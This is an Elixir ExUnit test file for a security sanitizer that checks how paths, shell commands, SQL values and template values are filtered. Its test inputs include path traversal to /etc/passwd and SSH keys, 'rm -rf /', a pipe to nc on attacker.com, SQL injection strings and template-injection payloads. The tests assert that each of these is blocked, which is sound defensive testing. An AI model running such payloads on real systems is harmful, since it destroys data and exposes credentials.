defmodule RubberDuck.Tool.Security.SanitizerTest do
  use ExUnit.Case, async: true

  alias RubberDuck.Tool.Security.Sanitizer

  describe "path sanitization" do
    test "allows normal paths" do
      assert {:ok, _} = Sanitizer.sanitize_path("test.txt")
      assert {:ok, _} = Sanitizer.sanitize_path("folder/file.txt")
    end

    test "blocks path traversal patterns" do
      assert {:error, "Path contains traversal patterns"} = Sanitizer.sanitize_path("../../../etc/passwd")
      assert {:error, "Path contains traversal patterns"} = Sanitizer.sanitize_path("..\\..\\windows\\system32")
      assert {:error, "Path contains traversal patterns"} = Sanitizer.sanitize_path("test%2e%2e%2ffile")
    end

    test "blocks null byte injection" do
      assert {:error, "Path contains traversal patterns"} = Sanitizer.sanitize_path("test.txt\x00.jpg")
    end

    test "blocks absolute paths outside allowed directories" do
      assert {:error, "Absolute paths not allowed"} = Sanitizer.sanitize_path("/etc/passwd")
      assert {:error, "Absolute paths not allowed"} = Sanitizer.sanitize_path("/root/.ssh/id_rsa")
    end

    test "allows certain absolute paths" do
      assert {:ok, _} = Sanitizer.sanitize_path("/tmp/test.txt")
      assert {:ok, _} = Sanitizer.sanitize_path("/var/tmp/upload.dat")
    end

    test "blocks access to special files" do
      assert {:error, "Access to special files not allowed"} = Sanitizer.sanitize_path(".ssh/id_rsa")
      assert {:error, "Access to special files not allowed"} = Sanitizer.sanitize_path(".env")
      assert {:error, "Access to special files not allowed"} = Sanitizer.sanitize_path("config/.aws/credentials")
    end

    test "rejects non-string paths" do
      assert {:error, "Path must be a string"} = Sanitizer.sanitize_path(123)
      assert {:error, "Path must be a string"} = Sanitizer.sanitize_path(nil)
    end
  end

  describe "command sanitization" do
    test "allows safe commands" do
      assert {:ok, "ls -la"} = Sanitizer.sanitize_command("ls -la")
      assert {:ok, "grep pattern file.txt"} = Sanitizer.sanitize_command("grep pattern file.txt")
    end

    test "blocks dangerous shell characters" do
      assert {:error, "Command contains dangerous characters"} = Sanitizer.sanitize_command("rm -rf /; echo done")
      assert {:error, "Command contains dangerous characters"} = Sanitizer.sanitize_command("ls | nc attacker.com 1234")
      assert {:error, "Command contains dangerous characters"} = Sanitizer.sanitize_command("echo $(whoami)")

      assert {:error, "Command contains dangerous characters"} =
               Sanitizer.sanitize_command("cat /etc/passwd && rm file")
    end

    test "sanitizes command argument lists" do
      assert {:ok, ["ls", "-la", "/tmp"]} = Sanitizer.sanitize_command(["ls", "-la", "/tmp"])

      assert {:error, "Command contains dangerous characters"} =
               Sanitizer.sanitize_command(["ls", "-la", "/tmp; rm -rf /"])
    end

    test "blocks overly long commands" do
      long_command = String.duplicate("a", 1001)
      assert {:error, "Command too long"} = Sanitizer.sanitize_command(long_command)
    end

    test "rejects invalid command types" do
      assert {:error, "Command must be a string or list"} = Sanitizer.sanitize_command(123)
      assert {:error, "Command must be a string or list"} = Sanitizer.sanitize_command(%{cmd: "ls"})
    end
  end

  describe "SQL sanitization" do
    test "allows safe SQL values" do
      assert {:ok, "john"} = Sanitizer.sanitize_sql("john")
      assert {:ok, 123} = Sanitizer.sanitize_sql(123)
      assert {:ok, true} = Sanitizer.sanitize_sql(true)
      assert {:ok, nil} = Sanitizer.sanitize_sql(nil)
    end

    test "blocks SQL injection patterns" do
      assert {:error, "Value contains SQL injection patterns"} =
               Sanitizer.sanitize_sql("'; DROP TABLE users; --")

      assert {:error, "Value contains SQL injection patterns"} =
               Sanitizer.sanitize_sql("1' OR '1'='1")

      assert {:error, "Value contains SQL injection patterns"} =
               Sanitizer.sanitize_sql("UNION SELECT * FROM passwords")
    end

    test "escapes dangerous characters" do
      assert {:ok, "O''Brien"} = Sanitizer.sanitize_sql("O'Brien")
      assert {:ok, "path\\\\to\\\\file"} = Sanitizer.sanitize_sql("path\\to\\file")
    end

    test "rejects unsupported types" do
      assert {:error, "Unsupported SQL value type"} = Sanitizer.sanitize_sql(%{key: "value"})
      assert {:error, "Unsupported SQL value type"} = Sanitizer.sanitize_sql([:list])
    end
  end

  describe "template sanitization" do
    test "allows safe template values" do
      assert {:ok, "Hello World"} = Sanitizer.sanitize_template("Hello World")
      assert {:ok, 123} = Sanitizer.sanitize_template(123)
      assert {:ok, true} = Sanitizer.sanitize_template(true)
    end

    test "blocks template injection patterns" do
      assert {:error, "Value contains template injection patterns"} =
               Sanitizer.sanitize_template("{{ 7*7 }}")

      assert {:error, "Value contains template injection patterns"} =
               Sanitizer.sanitize_template("<%= system('rm -rf /') %>")

      assert {:error, "Value contains template injection patterns"} =
               Sanitizer.sanitize_template("${java.lang.Runtime.getRuntime().exec('id')}")
    end

    test "HTML escapes output" do
      assert {:ok, "&lt;script&gt;alert('xss')&lt;/script&gt;"} =
               Sanitizer.sanitize_template("<script>alert('xss')</script>")
    end

    test "rejects unsupported types" do
      assert {:error, "Unsupported template value type"} = Sanitizer.sanitize_template(%{key: "value"})
    end
  end

  describe "parameter sanitization" do
    test "sanitizes parameters by type" do
      params = %{
        file_path: {:path, "test.txt"},
        command: {:command, "ls -la"},
        name: {:string, "john"},
        age: {:number, "25"}
      }

      assert {:ok, sanitized} = Sanitizer.sanitize_params(params)
      assert Map.has_key?(sanitized, :file_path)
      assert Map.has_key?(sanitized, :command)
      assert Map.has_key?(sanitized, :name)
      assert Map.has_key?(sanitized, :age)
    end

    test "returns error for first failed parameter" do
      params = %{
        good_param: {:string, "safe"},
        bad_param: {:path, "../../../etc/passwd"}
      }

      assert {:error, {:bad_param, _}} = Sanitizer.sanitize_params(params)
    end

    test "handles unknown types" do
      params = %{
        unknown_param: {:custom_type, "value"}
      }

      assert {:ok, %{unknown_param: "value"}} = Sanitizer.sanitize_params(params)
    end
  end

  describe "string sanitization" do
    test "removes null bytes and control characters" do
      assert {:ok, "clean text"} = Sanitizer.sanitize_string("clean\x00text")
      assert {:ok, "clean text"} = Sanitizer.sanitize_string("clean\x07text")
    end

    test "blocks overly long strings" do
      long_string = String.duplicate("a", 10001)
      assert {:error, "String too long"} = Sanitizer.sanitize_string(long_string)
    end

    test "converts non-strings to strings" do
      assert {:ok, "123"} = Sanitizer.sanitize_string(123)
      assert {:ok, "true"} = Sanitizer.sanitize_string(true)
    end
  end

  describe "number sanitization" do
    test "allows valid numbers" do
      assert {:ok, 123} = Sanitizer.sanitize_number(123)
      assert {:ok, 123.45} = Sanitizer.sanitize_number(123.45)
      assert {:ok, -42} = Sanitizer.sanitize_number(-42)
    end

    test "parses numeric strings" do
      assert {:ok, 123} = Sanitizer.sanitize_number("123")
      assert {:ok, 123.45} = Sanitizer.sanitize_number("123.45")
    end

    test "rejects invalid numeric values" do
      assert {:error, "Invalid numeric value"} = Sanitizer.sanitize_number(:infinity)
      assert {:error, "Invalid numeric value"} = Sanitizer.sanitize_number(:neg_infinity)
      assert {:error, "Invalid numeric value"} = Sanitizer.sanitize_number("not_a_number")
    end
  end

  describe "boolean sanitization" do
    test "allows valid booleans" do
      assert {:ok, true} = Sanitizer.sanitize_boolean(true)
      assert {:ok, false} = Sanitizer.sanitize_boolean(false)
    end

    test "converts string booleans" do
      assert {:ok, true} = Sanitizer.sanitize_boolean("true")
      assert {:ok, false} = Sanitizer.sanitize_boolean("false")
      assert {:ok, true} = Sanitizer.sanitize_boolean("1")
      assert {:ok, false} = Sanitizer.sanitize_boolean("0")
    end

    test "converts numeric booleans" do
      assert {:ok, true} = Sanitizer.sanitize_boolean(1)
      assert {:ok, false} = Sanitizer.sanitize_boolean(0)
    end

    test "rejects invalid boolean values" do
      assert {:error, "Invalid boolean value"} = Sanitizer.sanitize_boolean("maybe")
      assert {:error, "Invalid boolean value"} = Sanitizer.sanitize_boolean(2)
    end
  end

  describe "deep sanitization" do
    test "sanitizes nested maps" do
      data = %{
        user: %{
          name: "john",
          command: "ls -la"
        }
      }

      assert {:ok, sanitized} = Sanitizer.deep_sanitize(data, :string)
      assert sanitized.user.name == "john"
      assert sanitized.user.command == "ls -la"
    end

    test "sanitizes lists" do
      data = ["safe", "also safe", "still safe"]

      assert {:ok, sanitized} = Sanitizer.deep_sanitize(data, :string)
      assert sanitized == ["safe", "also safe", "still safe"]
    end

    test "propagates errors from nested sanitization" do
      data = %{
        safe: "good",
        dangerous: "../../../etc/passwd"
      }

      assert {:error, _} = Sanitizer.deep_sanitize(data, :path)
    end
  end
end
